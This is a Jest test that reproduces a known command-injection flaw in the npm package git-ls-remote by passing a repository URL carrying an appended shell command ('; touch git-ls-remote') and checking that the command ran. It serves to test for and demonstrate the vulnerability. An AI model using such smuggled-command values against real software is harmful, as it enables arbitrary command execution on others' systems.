//https://snyk.io/vuln/npm:git-ls-remote:20160923
test("Command Injection in git-ls-remote", (done) => {
  expect.assertions(2);
  const git = require("git-ls-remote");
  const fs = require("fs");
  const path = "./git-ls-remote";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  git.head("https://gitrepo.com/; touch git-ls-remote", function (err, result) {
    if (err) console.log("err!");
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
